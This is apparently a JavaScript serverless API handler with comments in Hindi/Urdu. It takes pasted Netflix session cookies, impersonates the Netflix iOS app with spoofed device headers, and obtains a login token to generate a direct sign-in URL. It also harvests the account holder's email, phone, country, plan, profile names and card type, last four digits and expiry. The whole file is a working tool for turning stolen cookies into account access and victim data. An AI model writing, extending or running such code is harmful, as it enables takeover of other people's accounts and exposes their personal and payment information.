// api/generate.js
const COUNTRY_MAP = {
  "CO":"🇨🇴 Colombia (CO)","FR":"🇫🇷 France (FR)","US":"🇺🇸 United States (US)",
  "IN":"🇮🇳 India (IN)","ES":"🇪🇸 Spain (ES)","DE":"🇩🇪 Germany (DE)",
  // poori map pehle jaise rakho (main ne last time di thi)
};

function getCountryDisplay(code) {
  return COUNTRY_MAP[code] ? `${COUNTRY_MAP[code]} (${code})` : code;
}

function extractCookies(text) {
  const keys = ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'];
  const cookies = {};
  try {
    const json = JSON.parse(text);
    if (Array.isArray(json) && json.length && json[0]?.name) {
      json.forEach(c => { if (keys.includes(c.name)) cookies[c.name] = c.value; });
    } else if (json && typeof json === 'object') {
      keys.forEach(k => { if (json[k] !== undefined) cookies[k] = json[k]; });
    }
  } catch (e) {}
  if (text.includes('\t')) {
    const lines = text.split(/\r\n|\r|\n/);
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed[0] === '#') continue;
      const parts = trimmed.split('\t');
      if (parts.length >= 7) {
        const name = parts[5].trim();
        let value = parts[6].trim();
        try { value = decodeURIComponent(value); } catch (_) {}
        if (keys.includes(name)) cookies[name] = value;
      }
    }
  }
  const segments = text.split(/[;\n\r]+/);
  for (let segment of segments) {
    segment = segment.trim();
    if (!segment) continue;
    if (segment.toLowerCase().startsWith('cookie:')) {
      segment = segment.substring(7).trim();
    }
    const eqPos = segment.indexOf('=');
    if (eqPos === -1) continue;
    let key = segment.substring(0, eqPos).trim();
    let value = segment.substring(eqPos + 1).trim().replace(/;+$/, '');
    try {
      key = decodeURIComponent(key);
      value = decodeURIComponent(value);
    } catch (_) {}
    if (keys.includes(key)) cookies[key] = value;
  }
  return cookies;
}

function parsePayment(account) {
  const payMethod = account.billing?.paymentMethod || account.paymentMethod || '';
  if (typeof payMethod === 'string') {
    const cardMatch = payMethod.match(/(\w+)\s+••••\s+(\d+)\s*(?:\(Exp:\s*(\d{2}\/\d{2})\))?/);
    if (cardMatch) {
      return {
        type: cardMatch[1],
        lastFourDigits: cardMatch[2],
        expiry: cardMatch[3] || 'N/A'
      };
    }
  }
  const creditCard = account.billing?.creditCard;
  if (creditCard) {
    return {
      type: creditCard.type || creditCard.cardType || payMethod,
      lastFourDigits: creditCard.lastFourDigits || creditCard.cardNumber?.slice(-4) || 'N/A',
      expiry: (creditCard.expirationMonth && creditCard.expirationYear)
        ? `${creditCard.expirationMonth}/${creditCard.expirationYear}`
        : 'N/A'
    };
  }
  return { type: payMethod || 'N/A', lastFourDigits: 'N/A', expiry: 'N/A' };
}

async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }

  const { cookie: raw_cookie, device = 'mobile' } = req.body || {};
  const trimmedCookie = (raw_cookie || '').trim();

  if (!trimmedCookie) {
    return res.status(400).json({ error: 'No cookie data provided.', cookie: '' });
  }

  try {
    const cookie_dict = extractCookies(trimmedCookie);
    if (!cookie_dict.NetflixId) {
      return res.status(400).json({
        error: 'Missing required cookie: NetflixId.',
        cookie: trimmedCookie.substring(0, 100)
      });
    }

    const api_url = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48';

    // ------- STEP 1: Get Token (exactly your original working code) -------
    const tokenQuery = new URLSearchParams({
      appVersion: '15.48.1',
      config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
      device_type: 'NFAPPL-02-',
      esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
      idiom: 'phone',
      iosVersion: '15.8.5',
      isTablet: 'false',
      languages: 'en-US',
      locale: 'en-US',
      maxDeviceWidth: '375',
      model: 'saget',
      modelType: 'IPHONE8-1',
      odpAware: 'true',
      path: '["account","token","default"]',   // original path jo token deta hai
      pathFormat: 'graph',
      pixelDensity: '2.0',
      progressive: 'false',
      responseFormat: 'json'
    });

    let tokenHeaders = {};
    if (device === 'desktop') {
      tokenHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-netflix.request.attempt': '1',
        'x-netflix.request.client.user.guid': cookie_dict.NetflixId,
        'x-netflix.context.profile-guid': cookie_dict.NetflixId,
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': '15.48.1',
        'x-netflix.argo.translated': 'true',
        'x-netflix.context.form-factor': 'desktop',
        'x-netflix.context.sdk-version': '2012.4',
        'x-netflix.client.appversion': '15.48.1',
        'x-netflix.context.max-device-width': '1920',
        'x-netflix.context.ab-tests': '',
        'x-netflix.tracing.cl.useractionid': 'DESKTOP-ACTION-ID',
        'x-netflix.client.type': 'web',
        'x-netflix.client.ftl.esn': 'NFCDIE-02-...',
        'x-netflix.context.locales': 'en-US',
        'x-netflix.context.top-level-uuid': 'DESKTOP-UUID',
        'accept-language': 'en-US;q=1',
        'x-netflix.argo.abtests': '',
        'x-netflix.context.os-version': 'Windows 10',
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': 'akira',
        'x-netflix.argo.nfnsm': '9',
        'x-netflix.context.pixel-density': '1.0',
        'x-netflix.request.toplevel.uuid': 'DESKTOP-TOP-UUID',
        'x-netflix.request.client.timezoneid': 'Asia/Dhaka',
        'Cookie': `NetflixId=${cookie_dict.NetflixId}`,
      };
    } else {
      tokenHeaders = {
        'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
        'x-netflix.request.attempt': '1',
        'x-netflix.request.client.user.guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
        'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': '15.48.1',
        'x-netflix.argo.translated': 'true',
        'x-netflix.context.form-factor': 'phone',
        'x-netflix.context.sdk-version': '2012.4',
        'x-netflix.client.appversion': '15.48.1',
        'x-netflix.context.max-device-width': '375',
        'x-netflix.context.ab-tests': '',
        'x-netflix.tracing.cl.useractionid': '4DC655F2-9C3C-4343-8229-CA1B003C3053',
        'x-netflix.client.type': 'argo',
        'x-netflix.client.ftl.esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
        'x-netflix.context.locales': 'en-US',
        'x-netflix.context.top-level-uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
        'x-netflix.client.iosversion': '15.8.5',
        'accept-language': 'en-US;q=1',
        'x-netflix.argo.abtests': '',
        'x-netflix.context.os-version': '15.8.5',
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': 'argo',
        'x-netflix.argo.nfnsm': '9',
        'x-netflix.context.pixel-density': '2.0',
        'x-netflix.request.toplevel.uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
        'x-netflix.request.client.timezoneid': 'Asia/Dhaka',
        'Cookie': `NetflixId=${cookie_dict.NetflixId}`,
      };
    }

    const tokenRes = await fetch(`${api_url}?${tokenQuery.toString()}`, {
      method: 'GET',
      headers: tokenHeaders,
    });

    if ([401, 403, 400].includes(tokenRes.status)) {
      return res.json({
        expired: true,
        error: 'Cookies expired or invalid.',
        cookie: trimmedCookie.substring(0, 100)
      });
    }

    if (!tokenRes.ok) {
      return res.status(tokenRes.status).json({
        error: `Netflix API returned HTTP ${tokenRes.status}`,
        cookie: trimmedCookie.substring(0, 100)
      });
    }

    const tokenData = await tokenRes.json();
    const tokenDefault = tokenData?.value?.account?.token?.default || {};
    const token = tokenDefault.token;
    let expires = tokenDefault.expires;

    if (!token) {
      return res.json({
        expired: true,
        error: 'Token not found. Cookie expired.',
        cookie: trimmedCookie.substring(0, 100)
      });
    }

    if (typeof expires === 'number' && expires.toString().length === 13) {
      expires = Math.floor(expires / 1000);
    }
    const login_url = `https://netflix.com/?nftoken=${encodeURIComponent(token)}`;

    // ------- STEP 2: Try to get Account Details (optional, fail silent) -------
    let accountDetails = null;
    try {
      const userQuery = new URLSearchParams({
        appVersion: '15.48.1',
        config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        device_type: 'NFAPPL-02-',
        esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
        idiom: 'phone',
        iosVersion: '15.8.5',
        isTablet: 'false',
        languages: 'en-US',
        locale: 'en-US',
        maxDeviceWidth: '375',
        model: 'saget',
        modelType: 'IPHONE8-1',
        odpAware: 'true',
        path: '["user","account"]',      // user & account, no token
        pathFormat: 'graph',
        pixelDensity: '2.0',
        progressive: 'false',
        responseFormat: 'json'
      });

      const userRes = await fetch(`${api_url}?${userQuery.toString()}`, {
        method: 'GET',
        headers: tokenHeaders,   // same headers work
      });

      if (userRes.ok) {
        const userData = await userRes.json();
        const user = userData?.value?.user || {};
        const account = userData?.value?.account || {};

        const email = user.email || 'N/A';
        const countryCode = user.countryOfSignup || 'N/A';
        const country_display = getCountryDisplay(countryCode);
        const planName = user.membershipPlan?.plan || 'N/A';
        const planDisplay = planName.charAt(0) + planName.slice(1).toLowerCase();
        const price = user.membershipPlan?.recurringCharge;
        const currency = user.membershipPlan?.currency;
        const price_display = price && currency ? `${currency} ${price}` : 'N/A';
        const memberSince = account.planInfo?.memberSince || user.membershipStartDate || 'N/A';
        const renewalDate = account.planInfo?.renewalDate || 'N/A';
        const payment = parsePayment(account);
        const phone = account.phone || user.phone || 'N/A';
        const profilesArray = user.profiles || [];
        const profileNames = profilesArray.map(p => p.profileName || p.name).filter(Boolean).join(', ') || 'N/A';
        const profilesCount = profilesArray.length || 'N/A';
        const membershipStatus = user.membershipStatus || 'CURRENT_MEMBER';
        const statusText = membershipStatus === 'CURRENT_MEMBER' ? 'Active' : 'Inactive';

        accountDetails = {
          email,
          phone,
          country: country_display,
          membershipStatus: statusText,
          memberSince,
          plan: {
            name: planDisplay,
            price: price || undefined,
            currency: currency || undefined
          },
          payment,
          profiles: {
            count: profilesCount,
            names: profileNames
          }
        };

        // Also we can add legacy fields to the accountDetails or outside, but we'll merge later
      }
    } catch (detailsError) {
      console.error('Account details fetch failed (non-critical):', detailsError);
    }

    // Build final response
    const baseResponse = {
      status: "SUCCESS",
      url: login_url,
      expires_ts: Number(expires),
      expires: new Date(Number(expires) * 1000).toISOString().replace('T', ' ').split('.')[0],
      account: accountDetails, // null if fetch failed
      // Legacy fields (use accountDetails if available, else fallback to N/A)
      email: accountDetails?.email || 'N/A',
      country: accountDetails ? accountDetails.country.split('(')[1]?.replace(')','') || 'N/A' : 'N/A',
      country_display: accountDetails?.country || 'N/A',
      plan: accountDetails?.plan?.name || 'N/A',
      price: accountDetails?.plan?.price && accountDetails.plan.currency ? `${accountDetails.plan.currency} ${accountDetails.plan.price}` : 'N/A',
      renewal_date: accountDetails?.memberSince ? (accountDetails.memberSince) : 'N/A',
      member_since: accountDetails?.memberSince || 'N/A',
      payment: accountDetails?.payment?.type ? `${accountDetails.payment.type}${accountDetails.payment.lastFourDigits !== 'N/A' ? ' •••• '+accountDetails.payment.lastFourDigits : ''}${accountDetails.payment.expiry !== 'N/A' ? ' (Exp: '+accountDetails.payment.expiry+')' : ''}` : 'N/A',
      phone: accountDetails?.phone || 'N/A',
      profiles_count: accountDetails?.profiles?.count || 'N/A',
      profile_names: accountDetails?.profiles?.names || 'N/A',
      x_mail: accountDetails?.email || 'N/A',
      x_tier: accountDetails?.plan?.name || 'N/A',
      x_loc: accountDetails ? accountDetails.country.split('(')[1]?.replace(')','') || 'N/A' : 'N/A',
      x_ren: accountDetails?.memberSince || 'N/A',
      x_mem: accountDetails?.memberSince || 'N/A',
      x_bil: accountDetails?.payment?.type || 'N/A',
      x_tel: accountDetails?.phone || 'N/A',
      x_usr: accountDetails?.profiles?.names || 'N/A',
    };

    return res.json(baseResponse);

  } catch (error) {
    console.error('Function error:', error);
    return res.status(500).json({
      error: 'Internal server error.',
      cookie: trimmedCookie.substring(0, 100)
    });
  }
}

module.exports = handler;
